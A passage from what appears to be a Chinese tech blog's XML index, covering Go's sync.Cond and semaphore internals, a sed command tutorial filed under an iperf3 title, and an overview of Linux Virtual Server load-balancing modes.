data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Weighted<span class="token punctuation">)</span> <span class="token function">Release</span><span class="token punctuation">(</span>n <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 将当前计数值减去释放的资源数n</span>    s<span class="token punctuation">.</span>cur <span class="token operator">-=</span> n    <span class="token keyword">if</span> s<span class="token punctuation">.</span>cur <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>      s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"semaphore: released more than held"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 尝试唤醒等待队列中的调用者，看是否有足够的资源被获取</span>    s<span class="token punctuation">.</span><span class="token function">notifyWaiters</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-sync.Cond</title>
      <link href="/Code/Code-Golang-Cond/"/>
      <url>/Code/Code-Golang-Cond/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h1 id="Cond"><a href="#Cond" class="headerlink" title="Cond"></a>Cond</h1><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>读写操作都由 <code>sync.Mutex</code> 进行并发安全的保护</p><ul><li>定义一个互斥锁，用于保护共享数据；</li><li>创建一个<code>sync.Cond</code>对象，关联这个互斥锁；</li><li>在需要等待条件变量的地方，获取这个互斥锁，并使用<code>Wait</code>方法等待条件变量被通知；</li><li>在需要通知等待的协程时，使用<code>Signal</code>或<code>Broadcast</code>方法通知等待的协程。</li><li>最后，释放这个互斥锁。</li></ul><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> mutex <span class="token operator">=</span> sync<span class="token punctuation">.</span>Mutex<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> cond <span class="token operator">=</span> sync<span class="token punctuation">.</span><span class="token function">NewCond</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token keyword">var</span> queue <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token keyword">func</span> <span class="token function">producer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    i <span class="token operator">:=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">&#123;</span>        mutex<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        queue <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        i<span class="token operator">++</span>        mutex<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        cond<span class="token punctuation">.</span><span class="token function">Signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">consumer</span><span class="token punctuation">(</span>consumerName <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">&#123;</span>        mutex<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token function">len</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>            cond<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>consumerName<span class="token punctuation">,</span> queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        queue <span class="token operator">=</span> queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        mutex<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 开启一个 producer</span>    <span class="token keyword">go</span> <span class="token function">producer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 开启两个 consumer</span>    <span class="token keyword">go</span> <span class="token function">consumer</span><span class="token punctuation">(</span><span class="token string">"consumer-1"</span><span class="token punctuation">)</span>    <span class="token keyword">go</span> <span class="token function">consumer</span><span class="token punctuation">(</span><span class="token string">"consumer-2"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">&#123;</span>        time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Minute<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul><li><code>NewCond</code>方法： 提供创建<code>Cond</code>实例的方法。注意该函数需要一个 Locker 作为必填参数，这是因为在 <code>cond.Wait()</code> 中底层会涉及到 Locker 的锁操作。</li><li>Wait<code>方法: 使当前线程进入阻塞状态，等待其他协程唤醒</code>。唤醒期间会解锁并切走 goroutine。</li><li><code>Singal</code>方法: 唤醒一个等待该条件变量的线程，如果没有线程在等待，则该方法会立即返回。</li><li>Broadcast&#96;方法: 唤醒所有等待该条件变量的线程，如果没有线程在等待，则该方法会立即返回。</li></ul><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Cond <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>   noCopy noCopy   <span class="token comment">// L is held while observing or changing the condition</span>   L Locker   notify  notifyList   checker copyChecker<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">NewCond</span><span class="token punctuation">(</span>l Locker<span class="token punctuation">)</span> <span class="token operator">*</span>Cond <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Cond<span class="token punctuation">)</span> <span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Cond<span class="token punctuation">)</span> <span class="token function">Signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Cond<span class="token punctuation">)</span> <span class="token function">Broadcast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> notifyList <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    wait <span class="token builtin">uint32</span>    notify <span class="token builtin">uint32</span>    <span class="token comment">// List of parked waiters.</span>    lock mutex    head <span class="token operator">*</span>sudog    tail <span class="token operator">*</span>sudog<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Wait"><a href="#Wait" class="headerlink" title="Wait"></a>Wait</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Cond<span class="token punctuation">)</span> <span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    c<span class="token punctuation">.</span>checker<span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 获取ticket</span>    t <span class="token operator">:=</span> <span class="token function">runtime_notifyListAdd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>notify<span class="token punctuation">)</span>    <span class="token comment">// 注意这里，必须先解锁，因为 runtime_notifyListWait 要切走 goroutine</span>    <span class="token comment">// 所以这里要解锁，要不然其他 goroutine 没法获取到锁了</span>    c<span class="token punctuation">.</span>L<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 将当前 goroutine 加入到 notifyList 里面，然后切走 goroutine</span>    <span class="token function">runtime_notifyListWait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>notify<span class="token punctuation">,</span> t<span class="token punctuation">)</span>    <span class="token comment">// 这里已经唤醒了，因此需要再度锁上</span>    c<span class="token punctuation">.</span>L<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">notifyListAdd</span><span class="token punctuation">(</span>l <span class="token operator">*</span>notifyList<span class="token punctuation">)</span> <span class="token builtin">uint32</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> atomic<span class="token punctuation">.</span><span class="token function">Xadd</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>wait<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">notifyListWait</span><span class="token punctuation">(</span>l <span class="token operator">*</span>notifyList<span class="token punctuation">,</span> t <span class="token builtin">uint32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>    <span class="token operator">...</span>    s <span class="token operator">:=</span> <span class="token function">acquireSudog</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>g <span class="token operator">=</span> <span class="token function">getg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>ticket <span class="token operator">=</span> t    <span class="token keyword">if</span> l<span class="token punctuation">.</span>tail <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        l<span class="token punctuation">.</span>head <span class="token operator">=</span> s    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        l<span class="token punctuation">.</span>tail<span class="token punctuation">.</span>next <span class="token operator">=</span> s    <span class="token punctuation">&#125;</span>    l<span class="token punctuation">.</span>tail <span class="token operator">=</span> s    <span class="token comment">// go park 切走 goroutine</span>    <span class="token function">goparkunlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>lock<span class="token punctuation">,</span> waitReasonSyncCondWait<span class="token punctuation">,</span> traceEvGoBlockCond<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment">// 注意：这个时候，goroutine 已经切回来了, 释放 sudog</span>    <span class="token function">releaseSudog</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/Image/image-cond-wait.png" alt="cond-wait" style="zoom:80%;" /><h3 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h3><p>唤醒一个 goroutine，且该 goroutine 是最早 Wait 的, FIFO 式的唤醒。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Cond<span class="token punctuation">)</span> <span class="token function">Signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">runtime_notifyListNotifyOne</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">.</span>notify<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">notifyListNotifyOne</span><span class="token punctuation">(</span>l <span class="token operator">*</span>notifyList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果二者相等，说明没有需要唤醒的 goroutine</span>    <span class="token keyword">if</span> atomic<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>wait<span class="token punctuation">)</span> <span class="token operator">==</span> atomic<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>notify<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token function">lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>    t <span class="token operator">:=</span> l<span class="token punctuation">.</span>notify    <span class="token keyword">if</span> t <span class="token operator">==</span> atomic<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>wait<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Update the next notify ticket number.</span>    atomic<span class="token punctuation">.</span><span class="token function">Store</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>notify<span class="token punctuation">,</span> t<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> p<span class="token punctuation">,</span> s <span class="token operator">:=</span> <span class="token punctuation">(</span><span class="token operator">*</span>sudog<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">.</span>head<span class="token punctuation">;</span> s <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">;</span> p<span class="token punctuation">,</span> s <span class="token operator">=</span> s<span class="token punctuation">,</span> s<span class="token punctuation">.</span>next <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> s<span class="token punctuation">.</span>ticket <span class="token operator">==</span> t <span class="token punctuation">&#123;</span>            n <span class="token operator">:=</span> s<span class="token punctuation">.</span>next            <span class="token keyword">if</span> p <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>                p<span class="token punctuation">.</span>next <span class="token operator">=</span> n            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                l<span class="token punctuation">.</span>head <span class="token operator">=</span> n            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>                l<span class="token punctuation">.</span>tail <span class="token operator">=</span> p            <span class="token punctuation">&#125;</span>            <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>lock<span class="token punctuation">)</span>            s<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token boolean">nil</span>            <span class="token comment">// 唤醒 goroutine</span>            <span class="token function">readyWithTime</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>l<span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次 Wait 的时候，都会同时生成一个 ticket，这个 ticket 作为此次 Wait 的唯一标识。ticket 是由 <code>notifyList.wait</code> 原子递增而来，因此 <code>notifyList.wait</code> 也同时代表当前最大的 ticket。</p><p>那么，每次唤醒的时候，也会对应一个 <code>notify</code> 属性。例如当前 <code>notify</code> 属性等于 1，则去逐个检查 <code>notifyList</code> 链表中 元素，找到 <code>ticket</code> 等于 1 的 goroutine 并唤醒，同时将 <code>notify</code> 属性进行原子递增。</p><p>这是因为 <code>notifyList</code> 会有乱序的可能。从我们上面 Wait 的过程可以看出，获取 <code>ticket</code> 和加入 <code>notifyList</code>，是两个独立的行为，中间会把锁释放掉。而当多个 goroutine 同时进行时，中间会产生进行并发操作，那么有可能后获取 ticket 的 goroutine，先插入到 <code>notifyList</code> 里面, 这就会造成 <code>notifyList</code> 轻微的乱序。Golang 的官方解释如下：</p><blockquote><p>Because g’s queue separately from taking numbers, there may be minor reorderings in the list.</p></blockquote><p>因此，这种 逐个匹配 <code>ticket</code> 的方式 ，即使在 notifyList 乱序的情况下，也能取到最先 Wait 的 goroutine。</p><p>这里有个问题是，对于这种方法我们需要逐个遍历 <code>notifyList</code>, 理论上来说，这是个 <code>O(n)</code> 的线性时间复杂度。Golang 也对这里做了解释：其实大部分场景下只用比较一两次之后就会很快停止，因此不用太担心性能问题。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li><p>sync.Cond不能拷贝，否则将会造成<code>panic(&quot;sync.Cond is copied&quot;)</code>错误</p></li><li><p>Wait 的调用一定要放在 Lock 和 UnLock 中间，否则将会造成 <code>panic(&quot;sync: unlock of unlocked mutex&quot;)</code> 错误。代码如下:</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">c<span class="token punctuation">.</span>L<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token operator">!</span><span class="token function">condition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">...</span> <span class="token builtin">make</span> use of condition <span class="token operator">...</span>c<span class="token punctuation">.</span>L<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Wait 调用的条件检查一定要放在 for 循环中，代码如上。这是因为当 Boardcast 唤醒时，有可能其他 goroutine 先于当前 goroutine 唤醒并抢到锁，导致轮到当前 goroutine 抢到锁的时候，条件又不再满足了。因此，需要将条件检查放在 for 循环中。</p></li><li><p>Signal 和 Boardcast 两个唤醒操作不需要加锁。</p></li></ol><h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="https://www.cyhone.com/articles/golang-sync-cond/">https://www.cyhone.com/articles/golang-sync-cond/</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-压测工具ab</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7ab/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7ab/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
            <tag> 压测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-压测工具iperf3</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7iperf3/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7iperf3/</url>
      
        <content type="html"><![CDATA[<h2 id="sed是什么"><a href="#sed是什么" class="headerlink" title="sed是什么"></a>sed是什么</h2><p>sed是stream editor的简称，也就是流编辑器。它一次处理一行内容，处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，不断重复，直到文件末尾。文件内容不会改变，除非使用重定向输出。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token punctuation">[</span>option<span class="token punctuation">]</span> <span class="token string">'command'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用option：</p><blockquote><p>-n 或–quiet或–silent 仅显示script处理后的结果.</p><p>-e 或–expression 以选项中指定的script来处理输入的文本文件。</p><p>-f 或–file 以选项中指定的script文件来处理输入的文本文件。</p><p>-r 让sed命令支持扩展的正则表达式(默认是基础正则表达式)。</p></blockquote><p>动作说明：</p><blockquote><p>a: 新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)。</p><p>c: 取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行。</p><p>d: 删除</p><p>i: 插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)。</p><p>p: 打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行</p><p>s: 取代，可以直接进行取代的工作。通常这个 s 的动作可以搭配正则表达式</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><p>插入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在第一行前添加字符串</span><span class="token function">sed</span> <span class="token string">'1i\添加的内容'</span> <span class="token function">file</span><span class="token comment"># 在最后一行行前添加字符串</span><span class="token function">sed</span> <span class="token string">'$i\添加的内容'</span> <span class="token function">file</span><span class="token comment"># 在最后一行行后添加字符串</span><span class="token function">sed</span> <span class="token string">'$a\添加的内容'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>替换</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注释掉含有“swap”的行</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/^[^#].*swap*/#&amp;/g'</span> fstab<span class="token comment"># 取消含有字符串swap的行最前面的注释符号#</span><span class="token comment">## //两杠表示空格，以空格替换#，等价取消#。</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'/^#.*swap/s/^#//g'</span> fstab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>删除</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除第2行</span><span class="token function">sed</span> <span class="token string">'2d'</span> filename<span class="token comment"># 删除1-4行</span><span class="token function">sed</span> <span class="token string">'1,4d'</span> filename<span class="token comment"># 删除1行和后2行,共3行</span><span class="token function">sed</span> <span class="token string">'1,+2d'</span> filename<span class="token comment"># 删除匹配到Coder的行和其后面的2行</span><span class="token function">sed</span> <span class="token string">'/Coder/,+2d'</span> filename<span class="token comment"># 删除奇数行</span><span class="token function">sed</span> <span class="token string">'1~2d'</span> filename<span class="token comment"># 删除偶数行</span><span class="token function">sed</span> <span class="token string">'2~2d'</span> filename<span class="token comment"># 删除匹配Coder的行</span><span class="token function">sed</span> <span class="token string">'/Coder/d'</span> filename<span class="token comment"># 删除所有空行</span><span class="token function">sed</span> <span class="token string">'/^$/d'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
            <tag> 压测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-压测工具wrk</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7wrk/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7wrk/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
            <tag> 压测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux virtual server (LVS)</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-Linux-LVS/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-Linux-LVS/</url>
      
        <content type="html"><![CDATA[<p>LVS是Linux virtual server的缩写，为linux虚拟服务器，是一个虚拟的服务器集群系统。LVS简单工作原理为用户请求LVS VIP，LVS根据转发方式和算法，将请求转发给后端服务器，后端服务器接收到请求，返回给用户。对于用户来说，看不到Web后端具体的应用。</p><h4 id="LVS集群三层结构"><a href="#LVS集群三层结构" class="headerlink" title="LVS集群三层结构"></a>LVS集群三层结构</h4><ul><li>负载调度器(Load Balancer):LVS集群对外的前端机器，负责将client的请求发送到一组服务器上执行，而client认为返回来的数据来自同一个IP</li><li>服务器池(Server Pool):正在执行client请求的服务器，一般是web服务器。还有FTP，MAIL，DNS等。</li><li>共享存储(Shared stord):为Server Pool提供一个共享的存储区，让服务器池拥有相同的内筒，提供相同的服务。</li></ul><h4 id="LVS相关概念"><a href="#LVS相关概念" class="headerlink" title="LVS相关概念"></a>LVS相关概念</h4><ul><li>DS：Director Server。指前段负载均衡器</li><li>RS：Real Server。后端服务器</li><li>VIP：向外部直接面向用户请求，作为用户请求的目标的IP地址</li><li>DIP：Director Server IP，主要用于和内部主机通讯的IP地址</li><li>RIP：Real Server IP，后端服务器的IP地址</li><li>CIP：Client IP，访问客户端的IP地址</li></ul><h4 id="LVS四种负载均衡模式"><a href="#LVS四种负载均衡模式" class="headerlink" title="LVS四种负载均衡模式"></a>LVS四种负载均衡模式</h4><h5 id="DR模式"><a href="#DR模式" class="headerlink" title="DR模式"></a>DR模式</h5><p>负载均衡器和 RS 都使用同一个 IP 对外服务，但只有负载均衡器对 ARP 请求进行响应。负载均衡器收到数据包后根据调度算法，找出对应的 RS, 把目的 MAC 地址改为 RS 的 MAC (IP 一致), 并将请求分发给这台 RS.RS 收到数据包并处理完成之后，由于 IP 一致，可以直接将数据返给客户端，与直接从客户端收到这个数据包无异，处理后直接返回给客户端</p><ol><li>客户端将请求发往前端的负载均衡器，请求报文源地址是 CIP, 目标地址为 VIP</li><li>负载均衡器将客户端请求报文的源 MAC 地址改为自己的 MAC 地址，目标 MAC 改为了 RS 的 MAC 地址，并将此包发送给 RS</li><li>处理完请求报文后，由于 RS 与 负载均衡器有具有同一 VIP, 会将响应报文直接发送给客户端</li></ol><p>![image-20230306142102784](&#x2F;Users&#x2F;suhang&#x2F;Library&#x2F;Application 